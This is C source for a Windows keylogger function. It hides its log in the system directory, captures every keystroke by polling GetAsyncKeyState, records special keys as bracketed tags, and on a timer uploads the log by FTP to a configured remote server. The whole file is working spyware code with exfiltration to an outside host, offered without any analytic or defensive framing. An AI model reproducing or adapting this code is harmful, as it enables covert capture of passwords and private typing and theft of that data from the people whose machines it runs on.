int Keylogger(void)
{
	char LogDir[256];
	GetSystemDirectory(LogDir,sizeof(LogDir));
	strcat(LogDir,KeylogFile);
	FILE *file = fopen(LogDir,"ab");
	HINTERNET nethandle = NULL, ftp = NULL;
	int Character;

	while(1) {
		if((GetTickCount() % FtpLogTime)==0) {
		nethandle = InternetOpen(UserAgent,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
		fclose(file);
		ftp = InternetConnect(nethandle,FtpServer,21,FtpUsername,FtpPassword,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE,0);
		FtpPutFile(ftp,LogDir,FtpFilename,INTERNET_FLAG_TRANSFER_BINARY,0);
		InternetCloseHandle(ftp);
		InternetCloseHandle(nethandle);
		file = fopen(LogDir,"ab");
		}
//		Sleep(10);
		for(Character=8;Character<=222;Character++)
                    {
                        if(GetAsyncKeyState(Character)==-32767)
                        {  
                                    if((Character>=39)&&(Character<=64))
                                    {
                                          fputc(Character,file);
                                          break;
                                    }        
                                    else if((Character>64)&&(Character<91))
                                    {
                                          Character+=32;
                                          fputc(Character,file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(Character)
                                        {
                                              case VK_SPACE:
                                              fputc(' ',file);
                                              break;    
                                              case VK_SHIFT:
                                              fputs("\r\n[SHIFT]\r\n",file);
                                              break;                                            
                                              case VK_RETURN:
                                              fputs("\r\n[ENTER]\r\n",file);
                                              break;
                                              case VK_BACK:
                                              fputs("\r\n[BACKSPACE]\r\n",file);
                                              break;
                                              case VK_TAB:
                                              fputs("\r\n[TAB]\r\n",file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("\r\n[CTRL]\r\n",file);
                                              break;    
                                              case VK_DELETE:
                                              fputs("\r\n[DEL]\r\n",file);
                                              break;
                                              case VK_OEM_1:
                                              fputs("\r\n[;:]\r\n",file);
                                              break;
                                              case VK_OEM_2:
                                              fputs("\r\n[/?]\r\n",file);
                                              break;
                                              case VK_OEM_3:
                                              fputs("\r\n[`~]\r\n",file);
                                              break;
                                              case VK_OEM_4:
                                              fputs("\r\n[ [{ ]\r\n",file);
                                              break;
                                              case VK_OEM_5:
                                              fputs("\r\n[\\|]\r\n",file);
                                              break;                                
                                              case VK_OEM_6:
                                              fputs("\r\n[ ]} ]\r\n",file);
                                              break;
                                              case VK_OEM_7:
                                              fputs("\r\n['\"]\r\n",file);
                                              break;
                                              case 187:
                                              fputc('+',file);
                                              break;
                                              case 188:
                                              fputc(',',file);
                                              break;
                                              case 189:
                                              fputc('-',file);
                                              break;
                                              case 190:
                                              fputc('.',file);
                                              break;
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("\r\n[CAPS LOCK]\r\n",file);
                                              break;
                                              default: break;
                                       }        
                                  }
                   } 
		}
	}
	return 0;
}
